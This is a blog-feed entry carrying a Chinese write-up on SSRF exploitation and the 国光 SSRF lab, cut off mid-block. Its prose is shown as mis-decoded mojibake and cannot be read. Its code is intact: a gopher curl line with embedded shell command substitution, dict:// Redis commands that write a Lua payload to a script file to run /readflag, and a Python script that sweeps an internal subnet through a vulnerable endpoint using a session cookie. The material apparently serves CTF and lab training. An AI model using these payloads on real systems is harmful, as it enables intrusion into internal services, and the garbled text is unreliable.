    <link href="/2025/04/07/SSRF%E6%B7%B1%E5%85%A5%E5%89%96%E6%9E%90-%E5%9B%BD%E5%85%89SSRF%E9%9D%B6%E5%9C%BA%E6%94%BB%E5%85%8B/"/>
    <url>/2025/04/07/SSRF%E6%B7%B1%E5%85%A5%E5%89%96%E6%9E%90-%E5%9B%BD%E5%85%89SSRF%E9%9D%B6%E5%9C%BA%E6%94%BB%E5%85%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‰äº›å¤©æœ‰ä¸ªå¸ˆå‚…é—®æˆ‘è½¯ä»¶å®‰å…¨èµ›é‚£ä¸ªssrfæ‰“redisçš„é¢˜ç›®ï¼Œå‘ç°è‡ªå·±å¯¹äºssrfè¿™ä¸€å—å¹¶ä¸æ˜¯å¾ˆæ‡‚ï¼Œæ²¡æœ‰è‡ªå·±çš„ä¸€ä¸ªæ€è·¯ï¼Œå€Ÿä»¥æ­¤ç¯‡æ¥å‰–æssrf</p><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>SSRFæ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿï¼Œå°±æ˜¯å› ä¸ºä»–æ˜¯æœåŠ¡ç«¯å‘èµ·çš„æ‰€æœ‰å¯ä»¥ç›´æ¥è®¿é—®å†…ç½‘èµ„æºï¼Œ<strong>ssrfçš„åˆ©ç”¨å¤§å¤šæ˜¯åè®®çš„åˆ©ç”¨</strong></p><h2 id="å¸¸è§åè®®"><a href="#å¸¸è§åè®®" class="headerlink" title="å¸¸è§åè®®"></a>å¸¸è§åè®®</h2><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><p><code>file://</code> æ˜¯ä¸€ç§<code>URI</code>åè®®ï¼Œç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­çš„æ–‡ä»¶ã€‚å®ƒå…è®¸åº”ç”¨ç¨‹åºæˆ–æµè§ˆå™¨ç›´æ¥ä»æœ¬åœ°å­˜å‚¨ä¸­è¯»å–æ–‡ä»¶ï¼Œè€Œæ— éœ€é€šè¿‡ç½‘ç»œè¯·æ±‚</p><p>è‹¥æˆ‘ä»¬å¯ä»¥æ§åˆ¶æœåŠ¡ç«¯ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ä»–è®¿é—®åˆ°å†…ç½‘æœºå™¨æ–‡ä»¶</p><p>åŸºæœ¬æ ¼å¼ï¼š<code>file://[ä¸»æœºå]/è·¯å¾„</code></p><ul><li><p><strong>ä¸»æœºå</strong>ï¼šé€šå¸¸ä¸ºç©ºï¼Œæˆ–è€… <code>localhost</code>ï¼Œè¡¨ç¤ºè®¿é—®æœ¬æœºæ–‡ä»¶ã€‚å¦‚æœæ˜¯è¿œç¨‹ç³»ç»Ÿï¼Œå¯ä»¥æŒ‡å®šä¸»æœºåï¼ˆä½†å¤šæ•°æƒ…å†µä¸‹ä¸æ”¯æŒï¼‰</p></li><li><p><strong>è·¯å¾„</strong>ï¼šæŒ‡å®šæœ¬åœ°æ–‡ä»¶çš„å®Œæ•´è·¯å¾„ï¼Œæ³¨æ„åŒºåˆ†Windows å’Œ Unix ç³»ç»Ÿ</p></li><li><p>Windows éœ€è¦ <strong>ä¸‰ä¸ªæ–œæ </strong>ï¼ˆ<code>///</code>ï¼‰ï¼Œå› ä¸º <code>C:</code> ç›˜ç¬¦æœ¬èº«åŒ…å« <code>:</code>ï¼Œè€Œ Unix åªéœ€è¦ä¸¤ä¸ªæ–œæ ï¼ˆ<code>//</code>ï¼‰</p></li></ul><h3 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h3><p>å¯ä»¥ç”¨æ¥æ¢æµ‹å†…ç½‘æœåŠ¡ï¼Œç«¯å£å¼€å¯æƒ…å†µï¼Œä»¥åŠå‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯å‘½ä»¤æ‰§è¡Œçš„æ—¶å€™å¿…é¡»æ˜¯æœªè®¾ç½®å¯†ç çš„æƒ…å†µ</p><p><strong>ä½¿ç”¨æ–¹å¼ï¼š</strong></p><ul><li><p><code>dict://serverip:port/</code>å‘½ä»¤:å‚æ•°</p></li><li><p>å‘æœåŠ¡å™¨çš„ç«¯å£è¯·æ±‚ä¸ºã€å‘½ä»¤:å‚æ•°ã€‘ï¼Œå¹¶åœ¨æœ«å°¾è‡ªåŠ¨è¡¥ä¸Š\r\n(å’³å’³<code>csrf</code>?)</p></li><li><p>dictåè®®æ‰§è¡Œå‘½ä»¤è¦ä¸€æ¡ä¸€æ¡æ‰§è¡Œ</p></li></ul><p>ä¸»è¦å°±æ˜¯æ¢æµ‹æœåŠ¡å’Œç«¯å£æƒ…å†µï¼Œæ‰§è¡Œå‘½ä»¤çš„æˆ–å¾ˆæ˜¯é¸¡è‚‹ï¼ŒåŸºæœ¬å°±åªæœ‰redisçš„æœªæˆæƒäº†</p><p>ä½†æ˜¯è¿˜æ˜¯å¯ä»¥æ¢æµ‹æœåŠ¡ç‰ˆæœ¬ï¼Œå°±æƒ³æˆ‘æœ¬åœ°å¼€ä¸ªmysqlæœ‰å¯†ç </p><p>ä½¿ç”¨dictå»è¿æ¥</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250407170723291.png" alt="image-20250407170723291"></p><p>å¯ä»¥çœ‹å‡ºæ˜¯mysqlæ•°æ®åº“(æ‰‹åŠ¨æ»‘ç¨½)ï¼Œè¿˜å¯ä»¥æ‰“æ‰“redisçš„æœªæˆæƒ</p><h3 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h3><p>gopheræ”¯æŒå‘å‡ºGETã€POSTè¯·æ±‚ã€‚å¯ä»¥å…ˆæˆªè·getè¯·æ±‚åŒ…å’Œpostè¯·æ±‚åŒ…ï¼Œå†æ„é€ æˆç¬¦åˆgopheråè®®çš„è¯·æ±‚ã€‚gopheråè®®æ˜¯ssrfåˆ©ç”¨ä¸­ä¸€ä¸ªæœ€å¼ºå¤§çš„åè®®(ä¿—ç§°ä¸‡èƒ½åè®®)ã€‚å¯ç”¨äºåå¼¹shellï¼Œåœ¨WWWå‡ºç°ä¹‹å‰ï¼ŒGopheræ˜¯Internetä¸Šæœ€ä¸»è¦çš„ä¿¡æ¯æ£€ç´¢å·¥å…·ï¼ŒGopherç«™ç‚¹ä¹Ÿæ˜¯æœ€ä¸»è¦çš„ç«™ç‚¹ï¼Œä½¿ç”¨TCP70ç«¯å£</p><p>ä½¿ç”¨æ ¼å¼ä¸º</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">gopher:</span>//&lt;server&gt;<span class="hljs-symbol">:&lt;port&gt;/&lt;prefix&gt;&lt;encoded_data&gt;</span><br></code></pre></td></tr></table></figure><ul><li><strong><code>&lt;prefix&gt;</code></strong> å¯ä»¥æ˜¯å•å­—ç¬¦ï¼ˆå¦‚ <code>_</code>ã€<code>1</code> ç­‰ï¼‰ï¼Œä½†éƒ¨åˆ†æœåŠ¡ä¼šæ ¹æ®å‰ç¼€å­—ç¬¦è§¦å‘ä¸åŒè¡Œä¸ºï¼ˆå¦‚ Redis ä¼šè§£æå‰ç¼€ä¸ºå‘½ä»¤é•¿åº¦ï¼‰ã€‚æ‰€ä»¥å¸¸ç”¨çš„è¿˜æ˜¯<code>_</code></li><li>æ•°æ®éƒ¨åˆ†çš„ç‰¹æ®Šå­—ç¬¦ï¼ˆå¦‚ <code>?</code>ã€<code>&amp;</code>ã€ç©ºæ ¼ç­‰ï¼‰å¿…é¡» URL ç¼–ç ï¼Œå¦åˆ™ä¼šè¢«æˆªæ–­æˆ–è§£æé”™è¯¯ã€‚</li></ul><p>è¿™ä¸ªåè®®æœ€å¥½ç©çš„å°±æ˜¯å¦‚æœgetshellçš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ç›´æ¥RCEï¼Œä¸ç”¨ç¼–ç ä¸ç”¨åšæ ¼å¼è½¬æ¢ï¼Œå¹¶ä¸”ç«¯å£åªéœ€è¦å­˜æ´»å³å¯ï¼Œä¸ç”¨ç‰¹æ®Šç«¯å£ï¼Œä½†æ˜¯å®ç”¨æ€§æ„Ÿè§‰ä¸å¤§</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl gopher://localhost:80/_`<span class="hljs-built_in">cat</span> /home/1.txt &gt; 2.txt`<br></code></pre></td></tr></table></figure><p>å‘½ä»¤æ˜¯æœåŠ¡ç«¯æ‰§è¡Œ</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250407175146983.png" alt="image-20250407175146983"></p><p>è¿™ä¸ªåè®®èƒ½å¤Ÿå®Œç¾çš„è§£å†³<code>dict</code>åè®®åªèƒ½æ‰§è¡Œä¸€æ¡å‘½ä»¤å¯¼è‡´æ— æ³•æ”»å‡»æˆæƒåº”ç”¨çš„çŸ­æ¿</p><h2 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h2><h3 id="gopherus"><a href="#gopherus" class="headerlink" title="gopherus"></a>gopherus</h3><p>gopheråè®®çš„å¼ºå¤§å·¥å…· <a href="https://github.com/Esonhugh/Gopherus3">åœ°å€</a></p><p>å®‰è£…ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">pip install --use-pep517 git+https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/Esonhugh/</span>Gopherus3.git <span class="hljs-comment">#é’ˆå¯¹python3æœ€æ–°ä¿®æ­£</span><br></code></pre></td></tr></table></figure><p>å·¥å…·çš„åŸºæœ¬é’ˆå¯¹çš„éƒ½æ˜¯æœªæˆæƒæœåŠ¡ï¼Œå¯¹äºsqlè¿™ç§æ‰‹å†™æ¯”è¾ƒéº»çƒ¦çš„ç¡®å®å·¥å…·ä¸é”™</p><p>ä½¿ç”¨</p><table><thead><tr><th>å‘½ä»¤</th><th>æè¿°</th></tr></thead><tbody><tr><td>gopherus3 â€“å¸®åŠ©</td><td>å¸®åŠ©</td></tr><tr><td>gopherus3 â€“æ¼æ´åˆ©ç”¨</td><td>å‚æ•°å¯ä»¥æ˜¯ ï¼š</td></tr><tr><td></td><td>â€“åˆ©ç”¨ mysql -h</td></tr><tr><td></td><td>â€“åˆ©ç”¨ postgresql -h</td></tr><tr><td></td><td>â€“exploit fastcgi -h</td></tr><tr><td></td><td>â€“exploit redis -h</td></tr><tr><td></td><td>â€“exploit zabbix -h</td></tr><tr><td></td><td>â€“åˆ©ç”¨ pymemcache -h</td></tr><tr><td></td><td>â€“åˆ©ç”¨ rbmemcache -h</td></tr><tr><td></td><td>â€“åˆ©ç”¨ phpmemcache -h</td></tr><tr><td></td><td>â€“dmpmemcache -h æ¼æ´åˆ©ç”¨</td></tr><tr><td></td><td>â€“åˆ©ç”¨ smtp -h</td></tr></tbody></table><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250407181707687.png" alt="image-20250407181707687"></p><p>åœ¨å¯¹payloadè¿›è¡ŒäºŒæ¬¡ç¼–ç å°±è¡Œ</p><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><p>CachedVisitor</p><p>æ­å»ºç¯å¢ƒ</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> build -t cachedvisitor:v1 .<br><span class="hljs-attribute">docker</span> run -d -p <span class="hljs-number">32777</span>:<span class="hljs-number">80</span> cachedvisitor:v1<br></code></pre></td></tr></table></figure><p> <img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408152900729.png" alt="image-20250408152900729"></p><p>å¯ä»¥é€šå¤–ç½‘</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408152948780.png" alt="image-20250408152948780"></p><p>å­˜åœ¨ssrfåŒæ—¶çœ‹åˆ°æœ‰ä¸ªredis</p><p>çœ‹çœ‹dictæ˜¯å¦å¯ç”¨</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408153340067.png" alt="image-20250408153340067"></p><p>dictå¯ç”¨ï¼Œè€Œä¸”rediså¯ç”¨æ‰§è¡Œå‘½ä»¤</p><p>åˆ†æä¸€ä¸‹æºç </p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">local</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read_file</span><span class="hljs-params">(filename)</span></span><br>    <span class="hljs-keyword">local</span> file = <span class="hljs-built_in">io</span>.<span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&quot;r&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> file <span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Error: Could not open file &quot;</span> .. filename)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>    <span class="hljs-keyword">end</span><br><br>    <span class="hljs-keyword">local</span> content = file:<span class="hljs-built_in">read</span>(<span class="hljs-string">&quot;*a&quot;</span>)<br>    file:<span class="hljs-built_in">close</span>()<br>    <span class="hljs-keyword">return</span> content<br><span class="hljs-keyword">end</span><br><br><span class="hljs-keyword">local</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute_lua_code</span><span class="hljs-params">(script_content)</span></span><br>    <span class="hljs-keyword">local</span> lua_code = script_content:<span class="hljs-built_in">match</span>(<span class="hljs-string">&quot;##LUA_START##(.-)##LUA_END##&quot;</span>)<br>    <span class="hljs-keyword">if</span> lua_code <span class="hljs-keyword">then</span><br>        <span class="hljs-keyword">local</span> chunk, err = <span class="hljs-built_in">load</span>(lua_code)<br>        <span class="hljs-keyword">if</span> chunk <span class="hljs-keyword">then</span><br>            <span class="hljs-keyword">local</span> success, result = <span class="hljs-built_in">pcall</span>(chunk)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> success <span class="hljs-keyword">then</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Error executing Lua code: &quot;</span>, result)<br>            <span class="hljs-keyword">end</span><br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Error loading Lua code: &quot;</span>, err)<br>        <span class="hljs-keyword">end</span><br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Error: No valid Lua code block found.&quot;</span>)<br>    <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br><span class="hljs-keyword">local</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br>    <span class="hljs-keyword">local</span> filename = <span class="hljs-string">&quot;/scripts/visit.script&quot;</span><br>    <span class="hljs-keyword">local</span> script_content = read_file(filename)<br>    <span class="hljs-keyword">if</span> script_content <span class="hljs-keyword">then</span><br>        execute_lua_code(script_content)<br>    <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br>main()<br><br></code></pre></td></tr></table></figure><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">COPY</span><span class="language-bash"> flag /flag</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> readflag /readflag</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> 400 /flag</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +xs /readflag</span><br><br></code></pre></td></tr></table></figure><p>luaè„šæœ¬ä¼šæ‰§è¡Œæˆ‘ä»¬å†™åœ¨<code>/scripts/visit.script</code>çš„è„šæœ¬ï¼Œæˆ‘ä»¬çš„ç›®çš„æ˜¯æ‰§è¡Œ<code>readfile</code></p><p>æˆ‘ä»¬ç”¨<code>redis</code>å°†<code> lua</code> å†™å…¥<code> visit.script</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">dict://127.0.0.1:6379/set:payload:<span class="hljs-string">&quot;##LUA_START##ngx.say(io.popen(&#x27;/readflag&#x27;):read(&#x27;*all&#x27;))##LUA_END##&quot;</span>  <span class="hljs-comment">#è®¾ç½®é”®payloadä¸ºæˆ‘ä»¬çš„å‘½ä»¤ </span><br>dict://127.0.0.1:6379/config:<span class="hljs-built_in">set</span>:<span class="hljs-built_in">dir</span>:/scripts/  <span class="hljs-comment">#æ›´æ”¹ Redis é…ç½®ï¼Œä½¿å…¶diræŒ‡å‘/scripts/ç›®å½•</span><br>dict://127.0.0.1:6379/config:<span class="hljs-built_in">set</span>:dbfilename:visit.script  <span class="hljs-comment">#æ›´æ”¹æ•°æ®åº“æ–‡ä»¶å</span><br>dict://127.0.0.1:6379/bgsave <span class="hljs-comment">#ä¿å­˜</span><br></code></pre></td></tr></table></figure><p>åœ¨åˆ·æ–°ä¸€ä¸‹æ‰§è¡Œè„šæœ¬</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408153944930.png" alt="image-20250408153944930"></p><p>æ‹¿åˆ°flag</p><h1 id="å›½å…‰SSRFé¶åœº"><a href="#å›½å…‰SSRFé¶åœº" class="headerlink" title="å›½å…‰SSRFé¶åœº"></a>å›½å…‰SSRFé¶åœº</h1><p>åœ°å€ï¼š<a href="https://github.com/Duoduo-chino/ssrf_vul">https://github.com/Duoduo-chino/ssrf_vul</a></p><p>GitHubä¸Šæ‰¾åˆ°çš„ç°æˆçš„é•œåƒ</p><p>é¶åœºæ‹“æ‰‘å›¾(ç½‘æ®µæœ‰å˜åŒ–);<code>Â·29.28æ²¡æœ‰</code></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/16205694239190.png" alt="16205694239190"></p><p>ä¿®æ”¹ä¸€ä¸‹<code>docker-compose.yml</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">&#x27;2&#x27;</span><br><br><span class="hljs-attr">networks:</span><br>  <span class="hljs-attr">ssrf_v:</span><br>    <span class="hljs-attr">ipam:</span><br>      <span class="hljs-attr">config:</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-attr">subnet:</span> <span class="hljs-number">172.16</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-string">/16</span><br>          <span class="hljs-attr">gateway:</span> <span class="hljs-number">172.16</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br><br><span class="hljs-attr">services:</span> <br>  <span class="hljs-attr">ssrfweb1:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">registry.cn-hangzhou.aliyuncs.com/jinduoduo/ssrf_web:v1</span><br>    <span class="hljs-attr">ports:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-number">32780</span><span class="hljs-string">:80</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-attr">ssrf_v:</span> <br>        <span class="hljs-attr">ipv4_address:</span> <span class="hljs-number">172.16</span><span class="hljs-number">.0</span><span class="hljs-number">.21</span><br> <br>  <span class="hljs-attr">ssrfweb2:</span> <br>    <span class="hljs-attr">image:</span> <span class="hljs-string">registry.cn-hangzhou.aliyuncs.com/jinduoduo/ssrf_web:v2</span><br>    <span class="hljs-attr">networks:</span> <br>      <span class="hljs-attr">ssrf_v:</span><br>        <span class="hljs-attr">ipv4_address:</span> <span class="hljs-number">172.16</span><span class="hljs-number">.0</span><span class="hljs-number">.22</span><br><br>  <span class="hljs-attr">ssrfweb3:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">registry.cn-hangzhou.aliyuncs.com/jinduoduo/ssrf_web:v3</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-attr">ssrf_v:</span><br>        <span class="hljs-attr">ipv4_address:</span> <span class="hljs-number">172.16</span><span class="hljs-number">.0</span><span class="hljs-number">.23</span><br><br>  <span class="hljs-attr">ssrfweb4:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">registry.cn-hangzhou.aliyuncs.com/jinduoduo/ssrf_web:v4</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-attr">ssrf_v:</span><br>        <span class="hljs-attr">ipv4_address:</span> <span class="hljs-number">172.16</span><span class="hljs-number">.0</span><span class="hljs-number">.24</span><br><br>  <span class="hljs-attr">ssrfweb5:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">registry.cn-hangzhou.aliyuncs.com/jinduoduo/ssrf_web:v5</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-attr">ssrf_v:</span><br>        <span class="hljs-attr">ipv4_address:</span> <span class="hljs-number">172.16</span><span class="hljs-number">.0</span><span class="hljs-number">.25</span><br><br>  <span class="hljs-attr">ssrfweb6:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">registry.cn-hangzhou.aliyuncs.com/jinduoduo/ssrf_web:v6</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-attr">ssrf_v:</span><br>        <span class="hljs-attr">ipv4_address:</span> <span class="hljs-number">172.16</span><span class="hljs-number">.0</span><span class="hljs-number">.26</span><br><br>  <span class="hljs-attr">ssrfweb7:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">registry.cn-hangzhou.aliyuncs.com/jinduoduo/ssrf_web:v7</span><br>    <span class="hljs-attr">networks:</span><br>      <span class="hljs-attr">ssrf_v:</span><br>        <span class="hljs-attr">ipv4_address:</span> <span class="hljs-number">172.16</span><span class="hljs-number">.0</span><span class="hljs-number">.27</span><br><br></code></pre></td></tr></table></figure><p>è¿›å…¥ç«™ç‚¹æ˜¯ä¸€ä¸ªçˆ¬è™«ç½‘ç«™ï¼Œæˆ‘ä»¬è¾“å…¥ç™¾åº¦è¯•è¯•</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408161712436.png" alt="image-20250408161712436"></p><p>å¯ä»¥å›æ˜¾ï¼Œè¯•ç€è¯»å–æ–‡ä»¶</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408161811463.png" alt="image-20250408161811463"></p><p>okä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œé‚£æˆ‘ä»¬è¯»å–é¦–é¡µæ–‡ä»¶çœ‹çœ‹</p><p><code>file:///var/www/html/index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">curl</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>&#123;<br>    <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br>  &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å¾ˆæ ‡å‡†çš„SSRFè¯·æ±‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬è¯»å–hostsæ–‡ä»¶çœ‹çœ‹</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250408162647474.png" alt="image-20250408162647474"></p><p>çŸ¥é“è¿™å°æœºå™¨æ˜¯<code>172.16.0.21</code>æˆ‘ä»¬å€ŸåŠ©<code>dict</code>åè®®æ‰«ä¸‹ç½‘æ®µ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>alive_ips = []<br><br>url = <span class="hljs-string">&quot;http://8.138.181.58:32780/&quot;</span><br>header=&#123;<span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;argon_user_token=f18a3b72b644797d7f5f2b4371711713&#x27;</span>&#125;<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">255</span>):<br>    ip = <span class="hljs-string">&quot;172.16.0.&quot;</span> + <span class="hljs-built_in">str</span>(i)<br>    <span class="hljs-keyword">try</span>:<br>        r = requests.post(url,headers=header, data=&#123;<span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">f&quot;dict://<span class="hljs-subst">&#123;ip&#125;</span>/&quot;</span>&#125;, timeout=<span class="hljs-number">1.5</span>)<br>        <span class="hljs-built_in">print</span>(ip + <span class="hljs-string">&quot;å­˜æ´»&quot;</span>)<br>        alive_ips.append(ip)<br>    <span class="hljs-keyword">except</span> requests.exceptions.Timeout:<br>        <span class="hljs-built_in">print</span>(ip + <span class="hljs-string">&quot;æœªå­˜æ´»&quot;</span>)<br>    time.sleep(<span class="hljs-number">0.5</span>)<br><br><span class="hljs-keyword">for</span> idx, ip <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(alive_ips, <span class="hljs-number">1</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;idx&#125;</span>. <span class="hljs-subst">&#123;ip&#125;</span>å­˜æ´»&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>ç»“æœï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 